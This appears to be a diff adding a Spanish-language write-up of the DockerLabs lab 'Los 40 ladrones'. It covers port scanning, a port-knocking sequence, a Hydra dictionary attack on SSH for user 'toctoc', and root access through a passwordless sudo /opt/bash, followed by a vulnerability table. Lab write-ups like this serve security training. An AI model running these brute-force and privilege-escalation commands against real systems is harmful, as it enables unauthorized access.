@@ -1,0 +1,204 @@
+---
+title: Los 40 ladrones
+description: Resolución completa de la máquina virtual *Los 40 ladrones* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Los 40 ladrones**, desarrollada por *firstatack* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web que contiene un archivo `qdefense.txt` con una pista sobre una secuencia de **port knocking**. Tras activar los puertos con la secuencia indicada, el servicio SSH se abre, permitiendo un ataque de fuerza bruta con Hydra para acceder como el usuario `toctoc`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `/opt/bash` como root sin autenticación, facilitando una escalada de privilegios directa y obteniendo acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Los 40 ladrones',
+    Autor: 'firstatack',
+    Dificultad: 'Fácil',
+    Fecha: '04/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip "Los 40 ladrones.zip"
+sudo bash auto_deploy.sh "Los 40 ladrones.tar"
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p "Los 40 ladrones"/{content,exploits,nmap,scripts}
+cd "Los 40 ladrones"
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762740635/Ports_r6w22o.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762740635/Gobuster_yuszm4.png)
+
+**Recursos detectados:**
+- `index.html` — Página por defecto de Apache.
+- `qdefense.txt` — Archivo de texto accesible con una pista.
+  ![Qdefense](https://res.cloudinary.com/dewqswzke/image/upload/v1762740636/qdefense_t3xu4l.png)
+
+El contenido de `qdefense.txt` sugiere una secuencia de puertos para activar un servicio adicional mediante port knocking, así como un posible nombre de usuario.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Port knocking
+
+Se utiliza la utilidad `knock` para enviar la secuencia de puertos indicada:
+
+```bash
+knock 172.17.0.2 7000,8000,9000 -v
+```
+
+![Knock](https://res.cloudinary.com/dewqswzke/image/upload/v1762740635/knock_vboi8k.png)
+
+Tras enviar la secuencia, se re-ejecuta un escaneo de puertos para comprobar cambios:
+
+```bash
+nmap -p- -sS -n 172.17.0.2 -oG after_knock
+extractPorts after_knock
+```
+
+El puerto **22/tcp (SSH)** se encuentra ahora abierto:
+
+![Ports2](https://res.cloudinary.com/dewqswzke/image/upload/v1762740635/Ports2_sty2pa.png)
+
+### 2.2 Fuerza bruta SSH
+
+Con SSH disponible y un usuario sugerido (`toctoc`), se realiza un ataque por diccionario con Hydra:
+
+```bash
+hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1762740635/hydra_gawclr.png)
+
+Se obtienen credenciales válidas y se establece sesión SSH:
+
+```bash
+ssh toctoc@172.17.0.2
+```
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De toctoc → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762740636/sudo-l_k8enik.png)
+
+El usuario puede ejecutar `/opt/bash` como root sin contraseña.
+
+Se ejecuta el binario:
+
+```bash
+sudo /opt/bash
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762740636/Root_sesnxx.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Exposición de pista de port knocking en archivo público",
+      severity: "Media",
+      impact: "Revelación de mecanismo de activación de servicios ocultos"
+    },
+    {
+      vulnerability: "Servicio SSH activado mediante port knocking sin autenticación adicional",
+      severity: "Media",
+      impact: "Exposición de servicio tras descubrimiento de la secuencia"
+    },
+    {
+      vulnerability: "Contraseña débil para usuario toctoc",
+      severity: "Crítica",
+      impact: "Acceso no autorizado mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en /opt/bash",
+      severity: "Crítica",
+      impact: "Escalada de privilegios directa a root"
+    },
+    {
+      vulnerability: "Falta de protección contra fuerza bruta en SSH",
+      severity: "Alta",
+      impact: "Ataques de diccionario ilimitados"
+    }
+  ]}
+/>
